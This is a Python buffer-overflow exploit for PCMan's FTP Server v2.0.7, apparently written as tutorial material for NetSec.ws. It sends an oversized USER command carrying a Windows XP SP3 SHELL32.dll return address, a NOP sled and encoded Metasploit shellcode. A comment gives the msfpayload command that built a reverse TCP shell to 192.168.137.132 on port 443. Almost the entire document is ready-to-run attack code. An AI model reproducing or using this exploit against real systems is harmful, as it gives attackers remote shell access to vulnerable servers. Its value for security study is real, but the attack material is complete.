# Final PCMan's FTP Server v2.0.7 Exploit
# Written for NetSec.ws
 
import sys, socket, time
 
# Use in the form "python fuzzer.py  "
 
host = sys.argv[1] # Recieve IP from user
port = int(sys.argv[2]) # Recieve Port from user
 
#badchar '0x00, 0x0A, 0x0D'
#msfpayload windows/shell_reverse_tcp LHOST=192.168.137.132 LPORT=443 R | msfencode -b '\x00\x0a\x0d' -e x86/shikata_ga_nai -t python
#[*] x86/shikata_ga_nai succeeded with size 341 (iteration=1)
 
buf =  ""
buf += "\x6a\x48\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xc5\xc7\x12"
buf += "\x06\x83\xeb\xfc\xe2\xf4\x39\xad\xf9\x4b\x2d\x3e\xed\xf9\x3a\xa7"
buf += "\x99\x6a\xe1\xe3\x99\x43\xf9\x4c\x6e\x03\xbd\xc6\xfd\x8d\x8a\xdf"
buf += "\x99\x59\xe5\xc6\xf9\x4f\x4e\xf3\x99\x07\x2b\xf6\xd2\x9f\x69\x43"
buf += "\xd2\x72\xc2\x06\xd8\x0b\xc4\x05\xf9\xf2\xfe\x93\x36\x2e\xb0\x22"
buf += "\x99\x59\xe1\xc6\xf9\x60\x4e\xcb\x59\x8d\x9a\xdb\x13\xed\xc6\xeb"
buf += "\x99\x8f\xa9\xe3\x0e\x67\x06\xf6\xc9\x62\x4e\x84\x22\x8d\x85\xcb"
buf += "\x99\x76\xd9\x6a\x99\x46\xcd\x99\x7a\x88\x8b\xc9\xfe\x56\x3a\x11"
buf += "\x74\x55\xa3\xaf\x21\x34\xad\xb0\x61\x34\x9a\x93\xed\xd6\xad\x0c"
buf += "\xff\xfa\xfe\x97\xed\xd0\x9a\x4e\xf7\x60\x44\x2a\x1a\x04\x90\xad"
buf += "\x10\xf9\x15\xaf\xcb\x0f\x30\x6a\x45\xf9\x13\x94\x41\x55\x96\x84"
buf += "\x41\x45\x96\x38\xc2\x6e\x05\x6f\x9b\x86\xa3\xaf\x13\xbd\xa3\x94"
buf += "\x9b\xe7\x50\xaf\xfe\xff\x6f\xa7\x45\xf9\x13\xad\x02\x57\x90\x38"
buf += "\xc2\x60\xaf\xa3\x74\x6e\xa6\xaa\x78\x56\x9c\xee\xde\x8f\x22\xad"
buf += "\x56\x8f\x27\xf6\xd2\xf5\x6f\x52\x9b\xfb\x3b\x85\x3f\xf8\x87\xeb"
buf += "\x9f\x7c\xfd\x6c\xb9\xad\xad\xb5\xec\xb5\xd3\x38\x67\x2e\x3a\x11"
buf += "\x49\x51\x97\x96\x43\x57\xaf\xc6\x43\x57\x90\x96\xed\xd6\xad\x6a"
buf += "\xcb\x03\x0b\x94\xed\xd0\xaf\x38\xed\x31\x3a\x17\x7a\xe1\xbc\x01"
buf += "\x6b\xf9\xb0\xc3\xed\xd0\x3a\xb0\xee\xf9\x15\xaf\xe2\x8c\xc1\x98"
buf += "\x41\xf9\x13\x38\xc2\x06";

# Return Address 0x7C9D30D7 in SHELL32.dll (Win XP SP3)
ret = '\xD7\x30\x9D\x7C' # Packed in little endian
 
# NOP Padding
nop = '\x90'*20
 
# EIP Writing Pattern
pattern = "A"*2000 + ret + nop + buf # Our exploit together. Junk -&gt; Return Address -&gt; NOPS -&gt; Shellcode
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Declare a TCP socket
client.connect((host, port)) # Connect to user supplied port and IP address
client.recv(1024) # Recieve FTP Banner
client.send("USER " + pattern) # Send the user command with a variable length name
client.close() # Close the Connection
